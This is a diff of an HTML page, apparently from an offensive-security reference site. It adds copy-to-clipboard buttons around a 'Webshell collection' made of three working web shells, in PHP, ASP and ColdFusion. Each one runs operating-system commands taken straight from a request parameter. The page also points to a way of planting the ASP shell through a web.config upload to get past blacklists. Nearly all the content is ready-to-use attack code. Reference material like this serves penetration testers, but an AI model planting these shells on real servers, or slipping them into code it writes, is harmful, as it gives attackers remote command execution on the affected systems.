@@ -375,14 +375,19 @@
               <h1>Webshell collection</h1>
               <h2 id="php">PHP</h2>
 <p>On the PHP page there is other <a href="/php/#command-execution">functions to execute code</a>:</p>
-<pre><code class="language-php">&lt;?php
+<div class="clipboard-content">  <pre><code class="language-php">&lt;?php
     if(isset($_GET['cmd'])) {
         system($_GET['cmd']);
     }
 ?&gt;
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="&lt;?php
+    if(isset($_GET['cmd'])) {
+        system($_GET['cmd']);
+    }
+?&gt;
+">    Copy  </button></div></div>
 <h2 id="asp">ASP</h2>
-<pre><code class="language-asp">&lt;%
+<div class="clipboard-content">  <pre><code class="language-asp">&lt;%
 Response.write(&quot;&lt;pre&gt;&quot;)
 Set rs = CreateObject(&quot;WScript.Shell&quot;)
 Set cmd = rs.Exec(&quot;cmd /c &quot; &amp; Request.QueryString(&quot;cmd&quot;))
@@ -390,16 +395,30 @@ o = cmd.StdOut.Readall()
 Response.write(o)
 Response.write(&quot;&lt;/pre&gt;&quot;)
 %&gt;
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="&lt;%
+Response.write(&quot;&lt;pre&gt;&quot;)
+Set rs = CreateObject(&quot;WScript.Shell&quot;)
+Set cmd = rs.Exec(&quot;cmd /c &quot; &amp; Request.QueryString(&quot;cmd&quot;))
+o = cmd.StdOut.Readall()
+Response.write(o)
+Response.write(&quot;&lt;/pre&gt;&quot;)
+%&gt;
+">    Copy  </button></div></div>
 <p>This payload can be include on a <a href="/iis/#bypass-blacklist-upload"><code>web.config</code> file</a></p>
 <h2 id="coldfusion">ColdFusion</h2>
-<pre><code class="language-cfm">&lt;cfsavecontent variable=&quot;cmdOutput&quot;&gt;
+<div class="clipboard-content">  <pre><code class="language-cfm">&lt;cfsavecontent variable=&quot;cmdOutput&quot;&gt;
 &lt;cfexecute name=&quot;C:\Windows\System32\cmd.exe&quot; arguments=&quot;/c #Request.cmd#&quot; timeout=&quot;10&quot;&gt;&lt;/cfexecute&gt;
 &lt;/cfsavecontent&gt;
 &lt;pre&gt;
 #HTMLCodeFormat(cmdOutput)#
 &lt;/pre&gt;
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="&lt;cfsavecontent variable=&quot;cmdOutput&quot;&gt;
+&lt;cfexecute name=&quot;C:\Windows\System32\cmd.exe&quot; arguments=&quot;/c #Request.cmd#&quot; timeout=&quot;10&quot;&gt;&lt;/cfexecute&gt;
+&lt;/cfsavecontent&gt;
+&lt;pre&gt;
+#HTMLCodeFormat(cmdOutput)#
+&lt;/pre&gt;
+">    Copy  </button></div></div>
             
           </div>
           <footer>
